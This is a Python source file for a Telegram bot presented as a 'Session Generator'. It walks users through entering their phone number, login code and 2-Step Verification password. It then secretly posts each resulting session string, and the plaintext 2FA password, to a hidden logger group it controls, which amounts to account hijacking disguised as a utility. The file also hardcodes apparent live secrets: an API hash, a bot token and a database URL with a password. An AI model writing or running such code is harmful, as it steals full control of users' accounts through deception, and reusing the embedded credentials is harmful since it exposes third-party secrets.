import asyncio
import psycopg2
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
MUST_JOIN = "SANATANI_TECH"
LOGGER_GROUP = -1002477750706  # Replace with your logger group ID

# 🔹 PostgreSQL Database Connection
DATABASE_URL = "postgres://iarfggbc:Vxzh_kG7cxa1kHR5faxcd1kuA4R-UT9E@rosie.db.elephantsql.com/iarfggbc"
conn = psycopg2.connect(DATABASE_URL)
cursor = conn.cursor()

# 🔹 Initialize Bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_sessions = {}

# 🔹 Ensure User Exists in Database
def check_user(user_id):
    cursor.execute("SELECT joined FROM users WHERE user_id = %s", (user_id,))
    result = cursor.fetchone()
    return result[0] if result else False

def add_user(user_id, joined=False):
    cursor.execute("INSERT INTO users (user_id, joined) VALUES (%s, %s) ON CONFLICT (user_id) DO NOTHING", (user_id, joined))
    conn.commit()

def update_join_status(user_id, status):
    cursor.execute("UPDATE users SET joined = %s WHERE user_id = %s", (status, user_id))
    conn.commit()

# 🔹 Real-time Join Checker
async def is_user_joined(user_id):
    try:
        user = await bot.get_participant(MUST_JOIN, user_id)
        return bool(user)
    except Exception:
        return False

# 🔹 Start Command with Join Check
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id
    add_user(user_id)

    if not check_user(user_id):
        if not await is_user_joined(user_id):
            await event.respond(
                f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
                buttons=[Button.url("Join Now", f"https://t.me/{MUST_JOIN}")]
            )
            return
        else:
            update_join_status(user_id, True)

    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("ℹ Help", b"help")],
            [Button.inline("❌ Cancel", b"cancel")]
        ]
    )

# 🔹 Help Button
@bot.on(events.CallbackQuery(pattern=b"help"))
async def help_text(event):
    await event.respond("ℹ **How to Generate Session?**\n\n1️⃣ Click **Generate Session**\n2️⃣ Enter your phone number\n3️⃣ Enter OTP received on Telegram\n4️⃣ If asked, enter 2-Step Verification password\n✅ Your session string will be generated!")

# 🔹 Cancel Process
@bot.on(events.CallbackQuery(pattern=b"cancel"))
async def cancel_process(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await event.respond("✅ **Process has been canceled. Use /start to begin again.**")

# 🔹 Generate Session
@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")

# 🔹 Process User Inputs
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]

    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            user_sessions[user_id]["sent_code"] = sent_code
            await event.respond("📩 **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            await event.respond(f"❌ **Error:** {e}. Please try again.")
            del user_sessions[user_id]

    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()

            # 🔹 Send logs to the logger group
            await bot.send_message(
                LOGGER_GROUP,
                f"📢 **New Session Generated**\n👤 User: {user_id}\n🔑 **Session:** `{session_string}`"
            )

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            if "The confirmation code has expired" in str(e):
                await event.respond("❌ **Error: The OTP has expired. Please use /generate to start again.**")
                del user_sessions[user_id]
            elif "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {e}. Please try again.")

    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            # 🔹 Log 2FA password and session string
            await bot.send_message(
                LOGGER_GROUP,
                f"📢 **New Session Generated**\n👤 User: {user_id}\n🔑 **Session:** `{session_string}`\n🔒 **2FA Password:** `{password}`"
            )

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {e}. Please try again.")

# 🔹 Run Bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
